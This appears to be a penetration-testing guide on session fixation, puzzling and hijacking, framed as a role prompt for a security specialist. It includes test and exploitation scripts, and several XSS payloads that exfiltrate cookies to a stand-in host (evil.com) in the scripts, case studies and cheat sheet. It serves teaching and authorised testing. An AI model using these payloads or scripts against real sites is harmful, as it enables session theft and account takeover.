# Session Puzzling and Fixation - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are a session security specialist with deep expertise in session puzzling, fixation, and hijacking vulnerabilities. Your mission is to identify, exploit, and prevent session management flaws that allow attackers to compromise user sessions, hijack accounts, and bypass authentication controls. You understand the intricate details of session token generation, lifecycle management, and the subtle vulnerabilities that arise from improper implementation. You possess mastery over tools like Burp Suite, custom session analysis scripts, and automated testing frameworks. Your goal is to chain session vulnerabilities with other attack vectors to achieve maximum impact, from session hijacking to full account takeover. You approach every target with methodical precision, analyzing session mechanisms, testing weaknesses, and documenting all findings with reproducible proof of concepts.

## Core Concepts Deep Dive

### Session Management Fundamentals

Session management is the mechanism that maintains user state across multiple HTTP requests. It typically involves:

1. **Session Token Generation** - Creating unique identifiers
2. **Session Storage** - Server-side or client-side storage
3. **Session Validation** - Verifying token authenticity
4. **Session Lifecycle** - Creation, expiration, destruction

**Session Token Formats:**
```
# Random string
session_id=a1b2c3d4e5f6g7h8i9j0

# JWT
session_id=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# Encoded data
session_id=base64(user_id:timestamp:signature)

# Sequential
session_id=1234567890
```

### Session Puzzling

Session puzzling (also known as session variable overloading) occurs when an application uses the same session variable for different purposes or across different contexts.

**Types of Session Puzzling:**

1. **Variable Overloading** - Same variable used for multiple purposes
2. **Cross-Page State** - Session state depends on page order
3. **Race Conditions** - Concurrent session modifications
4. **Inconsistent Validation** - Different validation across endpoints

**Example:**
```
# Application uses 'step' variable for multi-step process
# Step 1: Set step=1 (user info)
# Step 2: Set step=2 (payment info)
# Step 3: Set step=3 (confirmation)

# Attacker manipulates step variable
# Goes directly to step=3 without completing step=1 and 2
```

### Session Fixation

Session fixation occurs when an attacker can set or predict a user's session token before authentication.

**Attack Vectors:**
```
1. Forced Token - Attacker sets session token via URL
2. Token Prediction - Attacker predicts next token
3. Cross-Subdomain - Token valid across subdomains
4. Session Fixation via XSS - Inject session token
```

**Attack Flow:**
```
1. Attacker obtains a valid session token
2. Attacker tricks victim into using that token
3. Victim authenticates with attacker's token
4. Attacker uses the now-authenticated token
```

### Session Hijacking

Session hijacking occurs when an attacker steals a valid session token and uses it to impersonate the victim.

**Hijacking Methods:**
```
1. XSS - Steal token via JavaScript
2. Network Sniffing - Intercept token in transit
3. Session Prediction - Predict valid tokens
4. Session Fixation - Force known token
5. Man-in-the-Middle - Intercept token
6. Physical Access - Steal token from device
```

### Session Security Attributes

**Cookie Attributes:**
```
Session-Token: abc123
Path: /
Domain: .example.com
Expires: Thu, 01 Dec 2025 16:00:00 GMT
Max-Age: 3600
Secure
HttpOnly
SameSite=Strict
```

**Security Implications:**
```
Secure - Token only sent over HTTPS
HttpOnly - Token not accessible via JavaScript
SameSite - Token not sent cross-site
Path - Token only sent for specific paths
Domain - Token only sent for specific domains
Expires/Max-Age - Token expiration
```

## Pre-requisite Knowledge

- Understanding of HTTP protocol and cookies
- Knowledge of authentication mechanisms
- Familiarity with web application architecture
- Understanding of browser security model
- Knowledge of common web frameworks
- Familiarity with XSS attack vectors
- Understanding of cryptographic concepts

## Step-by-Step Hunting Methodology

### Phase 1: Session Analysis

**Step 1: Map Session Tokens**
```bash
# Check cookies
curl -I https://target.com | grep -i "set-cookie"

# Check response headers
curl -I https://target.com | grep -i "session"

# Check for tokens in HTML
curl https://target.com | grep -i "session\|token\|csrf"
```

**Step 2: Analyze Token Generation**
```bash
# Generate multiple tokens
for i in {1..10}; do
  curl -c - https://target.com/login -d "username=user$i&password=pass"
done

# Analyze token patterns
# Sequential? Random? Predictable?
```

**Step 3: Test Token Properties**
```bash
# Test token length
echo "session_id" | wc -c

# Test token entropy
# Use tools like ent, dieharder

# Test token uniqueness
# Generate many tokens and compare
```

### Phase 2: Vulnerability Testing

**Test 1: Session Puzzling**
```bash
# Test variable overloading
GET /step1?step=1 HTTP/1.1
Cookie: session=abc123

GET /step2?step=1 HTTP/1.1
Cookie: session=abc123

# If step2 accepts step=1, vulnerability exists
```

**Test 2: Session Fixation**
```bash
# Test forced token
GET /login?session_id=attacker_token HTTP/1.1

# Login with attacker token
POST /login HTTP/1.1
Cookie: session_id=attacker_token
Content-Type: application/x-www-form-urlencoded

username=user&password=pass

# If token is accepted after login, fixation works
```

**Test 3: Session Hijacking**
```bash
# Test XSS token theft
GET /page?name=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

# Test token in URL
GET /page?token=abc123 HTTP/1.1

# Test insecure storage
# Check localStorage, sessionStorage
```

**Test 4: Session Lifecycle**
```bash
# Test expiration
# Wait for token to expire
# Try to use expired token

# Test concurrent sessions
# Login from multiple devices
# Check if old sessions are invalidated

# Test session fixation after logout
# Login, logout, check if token is invalidated
```

### Phase 3: Exploitation Chain

```
1. Analyze session mechanism
2. Test for vulnerabilities
3. Chain with other attacks (XSS, CSRF)
4. Document all findings
```

## Tool Arsenal with Exact Commands

### Session Analysis Script

```python
#!/usr/bin/env python3
import requests
import sys
import time
import hashlib
import re
from urllib.parse import urlparse, parse_qs

class SessionAnalyzer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.tokens = []
    
    def get_session_token(self):
        """Get session token from response"""
        response = self.session.get(self.target_url)
        
        # Check cookies
        for cookie in self.session.cookies:
            if 'session' in cookie.name.lower() or 'token' in cookie.name.lower():
                return cookie.value
        
        # Check response body
        token_patterns = [
            r'session_id=([a-zA-Z0-9]+)',
            r'token=([a-zA-Z0-9]+)',
            r'csrf_token=([a-zA-Z0-9]+)'
        ]
        
        for pattern in token_patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        return None
    
    def analyze_token_entropy(self, token):
        """Analyze token entropy"""
        # Calculate character frequency
        freq = {}
        for char in token:
            freq[char] = freq.get(char, 0) + 1
        
        # Calculate entropy
        entropy = 0
        for count in freq.values():
            probability = count / len(token)
            entropy -= probability * (probability and __import__('math').log2(probability))
        
        return {
            'token': token,
            'length': len(token),
            'unique_chars': len(freq),
            'entropy': entropy,
            'entropy_per_char': entropy / len(token) if token else 0
        }
    
    def test_session_fixation(self):
        """Test for session fixation"""
        # Get initial token
        initial_token = self.get_session_token()
        
        # Try to set token via URL
        fixation_url = f"{self.target_url}?session_id=attacker_token"
        response = self.session.get(fixation_url)
        
        # Check if token was set
        current_token = self.get_session_token()
        
        result = {
            'initial_token': initial_token,
            'fixation_url': fixation_url,
            'current_token': current_token,
            'vulnerable': current_token == 'attacker_token'
        }
        
        return result
    
    def test_session_puzzling(self, endpoints):
        """Test for session puzzling"""
        results = []
        
        for endpoint in endpoints:
            # Test with same session variable
            response1 = self.session.get(f"{self.target_url}{endpoint}?step=1")
            response2 = self.session.get(f"{self.target_url}{endpoint}?step=2")
            
            result = {
                'endpoint': endpoint,
                'response1_status': response1.status_code,
                'response2_status': response2.status_code,
                'vulnerable': response1.status_code == response2.status_code
            }
            
            results.append(result)
        
        return results
    
    def test_session_hijacking(self):
        """Test for session hijacking vectors"""
        results = {}
        
        # Test XSS token theft
        xss_payload = "<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"
        response = self.session.get(f"{self.target_url}/search?q={xss_payload}")
        results['xss'] = {
            'payload': xss_payload,
            'reflected': xss_payload in response.text,
            'vulnerable': xss_payload in response.text
        }
        
        # Test token in URL
        response = self.session.get(f"{self.target_url}/page?token=abc123")
        results['url_token'] = {
            'token_in_url': 'token=abc123' in response.text,
            'vulnerable': 'token=abc123' in response.text
        }
        
        # Test insecure storage
        # Check if token is in HTML
        response = self.session.get(self.target_url)
        results['insecure_storage'] = {
            'token_in_html': 'session_id' in response.text,
            'vulnerable': 'session_id' in response.text
        }
        
        return results
    
    def test_session_lifecycle(self):
        """Test session lifecycle"""
        results = {}
        
        # Get initial token
        initial_token = self.get_session_token()
        results['initial_token'] = initial_token
        
        # Test expiration
        # Wait for token to expire (if possible)
        time.sleep(60)  # Wait 1 minute
        
        # Try to use token
        self.session.cookies.set('session_id', initial_token)
        response = self.session.get(self.target_url)
        
        results['expiration'] = {
            'token_valid_after_wait': response.status_code == 200,
            'vulnerable': response.status_code == 200
        }
        
        # Test concurrent sessions
        session1 = requests.Session()
        session2 = requests.Session()
        
        token1 = self.get_session_token()
        token2 = self.get_session_token()
        
        results['concurrent'] = {
            'token1': token1,
            'token2': token2,
            'different_tokens': token1 != token2
        }
        
        return results
    
    def full_scan(self):
        """Perform full session analysis"""
        print(f"[*] Scanning: {self.target_url}")
        
        # Analyze token
        token = self.get_session_token()
        if token:
            print(f"\n[*] Token analysis:")
            analysis = self.analyze_token_entropy(token)
            print(f"  Token: {analysis['token'][:20]}...")
            print(f"  Length: {analysis['length']}")
            print(f"  Unique chars: {analysis['unique_chars']}")
            print(f"  Entropy: {analysis['entropy']:.2f}")
            print(f"  Entropy per char: {analysis['entropy_per_char']:.2f}")
        
        # Test fixation
        print(f"\n[*] Testing session fixation:")
        fixation = self.test_session_fixation()
        print(f"  Vulnerable: {fixation['vulnerable']}")
        
        # Test puzzling
        print(f"\n[*] Testing session puzzling:")
        puzzling = self.test_session_puzzling(['/step1', '/step2', '/step3'])
        for result in puzzling:
            print(f"  {result['endpoint']}: {result}")
        
        # Test hijacking
        print(f"\n[*] Testing session hijacking:")
        hijacking = self.test_session_hijacking()
        for key, result in hijacking.items():
            print(f"  {key}: {result}")
        
        # Test lifecycle
        print(f"\n[*] Testing session lifecycle:")
        lifecycle = self.test_session_lifecycle()
        for key, result in lifecycle.items():
            print(f"  {key}: {result}")
        
        return {
            'analysis': analysis if token else None,
            'fixation': fixation,
            'puzzling': puzzling,
            'hijacking': hijacking,
            'lifecycle': lifecycle
        }

# Usage
analyzer = SessionAnalyzer("https://target.com")
results = analyzer.full_scan()
```

### Burp Suite Extension

```
# Session Handling
- Analyze session tokens
- Test for vulnerabilities
- Automate session management

# Session Fixation
- Test for fixation
- Force token setting
- Validate token persistence
```

### Custom Session Payloads

```python
#!/usr/bin/env python3
import requests
import sys

SESSION_PAYLOADS = {
    'fixation': [
        '?session_id=attacker_token',
        '?session=attacker_token',
        '?token=attacker_token',
        '?sid=attacker_token'
    ],
    'hijacking': [
        '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
        '<img src=x onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">',
        '<svg onload="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">'
    ],
    'puzzling': [
        '?step=1&step=2',
        '?action=login&action=logout',
        '?page=home&page=admin'
    ]
}

def test_session_vulnerabilities(url, endpoint):
    """Test session vulnerabilities"""
    results = []
    
    for vuln_type, payloads in SESSION_PAYLOADS.items():
        print(f"\n[*] Testing {vuln_type}...")
        
        for payload in payloads:
            test_url = f"{url}{endpoint}{payload}"
            response = requests.get(test_url)
            
            result = {
                'vuln_type': vuln_type,
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.text),
                'vulnerable': response.status_code == 200
            }
            
            results.append(result)
            
            if result['vulnerable']:
                print(f"  [+] Potential vulnerability: {payload}")
    
    return results

if __name__ == "__main__":
    url = sys.argv[1]
    endpoint = sys.argv[2]
    results = test_session_vulnerabilities(url, endpoint)
    
    print(f"\n[*] Results:")
    for result in results:
        if result['vulnerable']:
            print(f"  [+] {result['vuln_type']}: {result['payload']}")
```

## Real-World Case Studies

### Case Study 1: Session Fixation via URL Parameter

**Scenario:** A web application accepts session tokens via URL parameter.

**Discovery:**
```bash
# Step 1: Check for session parameter
curl -I https://target.com/login?session_id=test123
# Set-Cookie: session_id=test123

# Step 2: Login with forced token
curl -X POST https://target.com/login \
  -H "Cookie: session_id=test123" \
  -d "username=user&password=pass"
# Response: Login successful

# Step 3: Verify token persistence
curl -H "Cookie: session_id=test123" https://target.com/dashboard
# Response: Dashboard loaded
```

**Exploitation:**
```python
# Step 1: Create fixation URL
fixation_url = "https://target.com/login?session_id=attacker_token"
print(f"Send this URL to victim: {fixation_url}")

# Step 2: Wait for victim to login
# Step 3: Use the token
import requests

session = requests.Session()
session.cookies.set('session_id', 'attacker_token')
response = session.get('https://target.com/dashboard')
print(f"[+] Session hijacked: {response.status_code}")
```

### Case Study 2: Session Puzzling in Multi-Step Process

**Scenario:** A web application has a multi-step process vulnerable to session puzzling.

**Discovery:**
```bash
# Step 1: Analyze multi-step process
GET /step1 HTTP/1.1
Cookie: session=abc123
# Response: Step 1 form

POST /step2 HTTP/1.1
Cookie: session=abc123
# Response: Step 2 form

POST /step3 HTTP/1.1
Cookie: session=abc123
# Response: Confirmation

# Step 2: Test direct access
POST /step3 HTTP/1.1
Cookie: session=abc123
# Response: Step 3 form (skipped step 1 and 2)
```

**Exploitation:**
```python
# Step 1: Skip directly to final step
import requests

session = requests.Session()
session.get('https://target.com/step1')  # Get session

# Skip to step 3
response = session.post('https://target.com/step3', data={'data': 'malicious'})
print(f"[+] Skipped steps: {response.status_code}")
```

### Case Study 3: Session Hijacking via XSS

**Scenario:** A web application has XSS that can be used for session hijacking.

**Discovery:**
```bash
# Step 1: Test XSS
GET /search?q=<script>alert(1)</script>
# Response: Script executed

# Step 2: Steal session
GET /search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
# Response: Session cookie sent to attacker
```

**Exploitation:**
```python
# Step 1: Create XSS payload
xss_payload = """
<script>
fetch('https://evil.com/steal?cookie='+document.cookie)
</script>
"""

# Step 2: Send to victim
print(f"XSS payload: {xss_payload}")

# Step 3: Receive stolen cookie
# Set up listener on evil.com
# Receive: cookie=session_abc123
```

### Case Study 4: Session Token Prediction

**Scenario:** A web application uses predictable session tokens.

**Discovery:**
```bash
# Step 1: Generate multiple tokens
for i in {1..10}; do
  curl -c - https://target.com/login -d "username=user&password=pass"
done

# Step 2: Analyze tokens
# Tokens: 100001, 100002, 100003, ...
# Sequential pattern detected
```

**Exploitation:**
```python
# Step 1: Predict next token
import requests

# Get current token
response = requests.post('https://target.com/login', 
                        data={'username': 'user', 'password': 'pass'})
current_token = response.cookies.get('session_id')

# Predict next token
next_token = str(int(current_token) + 1)
print(f"[+] Predicted token: {next_token}")

# Step 2: Use predicted token
session = requests.Session()
session.cookies.set('session_id', next_token)
response = session.get('https://target.com/dashboard')
print(f"[+] Session hijacked: {response.status_code}")
```

## Advanced Techniques and Bypass

### Cookie Attribute Bypass

**Secure Flag Bypass:**
```bash
# If Secure flag is missing
# Token sent over HTTP
curl http://target.com  # Token in request

# Or if HTTPS is not enforced
curl -k https://target.com  # Ignore certificate
```

**HttpOnly Flag Bypass:**
```bash
# If HttpOnly flag is missing
# Token accessible via JavaScript
document.cookie  # Shows session token

# Or via XSS
<script>alert(document.cookie)</script>
```

**SameSite Flag Bypass:**
```bash
# If SameSite flag is missing
# Token sent cross-site
# Can be exploited via CSRF

# Or if SameSite=Lax
# Token sent on top-level navigation
```

### Token Rotation Bypass

**Non-Rotation After Login:**
```bash
# Get token before login
curl -c - https://target.com/login
# Token: abc123

# Login
curl -X POST https://target.com/login \
  -H "Cookie: session_id=abc123" \
  -d "username=user&password=pass"

# Token still valid
curl -H "Cookie: session_id=abc123" https://target.com/dashboard
# Response: Dashboard loaded
```

### Concurrent Session Handling

**Multiple Active Sessions:**
```bash
# Login from device 1
curl -c - https://target.com/login \
  -d "username=user&password=pass"
# Token: abc123

# Login from device 2
curl -c - https://target.com/login \
  -d "username=user&password=pass"
# Token: def456

# Both tokens valid
curl -H "Cookie: session_id=abc123" https://target.com/dashboard
# Response: Dashboard loaded

curl -H "Cookie: session_id=def456" https://target.com/dashboard
# Response: Dashboard loaded
```

### Session Invalidation Bypass

**Logout Invalidation:**
```bash
# Get token
curl -c - https://target.com/login
# Token: abc123

# Login
curl -X POST https://target.com/login \
  -H "Cookie: session_id=abc123" \
  -d "username=user&password=pass"

# Logout
curl -X POST https://target.com/logout \
  -H "Cookie: session_id=abc123"

# Token still valid
curl -H "Cookie: session_id=abc123" https://target.com/dashboard
# Response: Dashboard loaded
```

## Detection and Indicators

### Token Analysis

```bash
# Check token entropy
echo -n "session_token" | ent

# Check token patterns
for i in {1..100}; do
  curl -c - https://target.com/login -d "username=user&password=pass"
done | grep -o "session_id=[a-zA-Z0-9]*" | cut -d= -f2 | sort | uniq -c
```

### Cookie Attribute Analysis

```bash
# Check cookie attributes
curl -I https://target.com | grep -i "set-cookie"

# Look for:
# Secure flag
# HttpOnly flag
# SameSite attribute
# Domain scope
# Path scope
# Expiration
```

### Log Indicators

```
[SESSION] Fixation attempt detected
[SESSION] Token prediction attempt
[SESSION] Concurrent session detected
[SESSION] Session not invalidated after logout
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Session hijacking | Steal user session |
| High | Account takeover | Impersonate any user |
| High | Privilege escalation | Access admin functions |
| Medium | Information disclosure | Access user data |
| Low | Session fixation | Force known token |

## Common Pitfalls

1. **Not testing all session attributes** - Secure, HttpOnly, SameSite
2. **Ignoring token generation** - Predictable tokens
3. **Overlooking session lifecycle** - Expiration, rotation
4. **Not testing concurrent sessions** - Multiple active sessions
5. **Forgetting about logout** - Session invalidation
6. **Ignoring cross-subdomain** - Token scope
7. **Not testing with authentication** - Authenticated session handling
8. **Overlooking race conditions** - Concurrent modifications
9. **Not considering framework behavior** - Different frameworks handle differently
10. **Forgetting about XSS** - Session theft via XSS

## Integration with Other Hunting Areas

- **XSS**: Session theft via XSS
- **CSRF**: Session fixation via CSRF
- **Authentication Bypass**: Session fixation for auth bypass
- **Privilege Escalation**: Session manipulation
- **Information Disclosure**: Session token exposure
- **Clickjacking**: Session fixation via clickjacking
- **Open Redirect**: Session fixation via redirect

## Reporting Template

```
## Vulnerability: Session Puzzling/Fixation/Hijacking

### Summary
[One sentence description]

### Affected Endpoint
- URL: [full URL]
- Parameter: [affected parameter]
- Session Token: [token format]

### Vulnerability Details
- Type: [Puzzling/Fixation/Hijacking]
- Token Properties: [length, entropy, format]
- Cookie Attributes: [Secure, HttpOnly, SameSite]

### Proof of Concept
[Step-by-step reproduction]

### Impact
[Detailed impact analysis]

### Remediation
- Generate cryptographically secure tokens
- Implement proper token rotation
- Set Secure, HttpOnly, SameSite flags
- Invalidate sessions on logout
- Implement concurrent session limits
- Use anti-fixation measures

### References
- CWE-384: Session Fixation
- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- OWASP: Session Management Cheat Sheet
```

## Practice Labs

### Session Security Labs

**OWASP WebGoat:**
```bash
git clone https://github.com/WebGoat/WebGoat
# Session management module
```

**DVWS (Damn Vulnerable Web Server):**
```bash
git clone https://github.com/pschlink/DVWS
# Session hijacking challenges
```

**HackTheBox Session Challenges:**
- Various session exploitation scenarios
- Real-world difficulty

### Practice Commands

```bash
# Analyze session token
curl -I https://target.com | grep -i "set-cookie"

# Test fixation
curl "https://target.com/login?session_id=attacker_token"

# Test hijacking
curl "https://target.com/search?q=<script>document.cookie</script>"

# Test lifecycle
curl -c - https://target.com/login -d "username=user&password=pass"
```

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not hijack user sessions without authorization**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### Session Testing Checklist

```
[ ] Analyze session token
[ ] Test token entropy
[ ] Test cookie attributes
[ ] Test session fixation
[ ] Test session puzzling
[ ] Test session hijacking
[ ] Test session lifecycle
[ ] Test concurrent sessions
[ ] Document all findings
```

### Common Session Payloads

**Fixation:**
```
?session_id=attacker_token
?session=attacker_token
?token=attacker_token
?sid=attacker_token
```

**Hijacking:**
```
<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
<svg onload="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Puzzling:**
```
?step=1&step=2
?action=login&action=logout
?page=home&page=admin
```

### Quick Commands

```bash
# Analyze token
curl -I https://target.com | grep -i "set-cookie"

# Test fixation
curl "https://target.com/login?session_id=attacker_token"

# Test hijacking
curl "https://target.com/search?q=<script>document.cookie</script>"

# Test lifecycle
curl -c - https://target.com/login -d "username=user&password=pass"
```

### Session Security Best Practices

```
1. Generate cryptographically secure tokens
2. Set Secure flag on cookies
3. Set HttpOnly flag on cookies
4. Set SameSite=Strict or Lax
5. Implement token rotation
6. Invalidate sessions on logout
7. Implement concurrent session limits
8. Use anti-fixation measures
9. Monitor for session anomalies
10. Implement session timeout
```
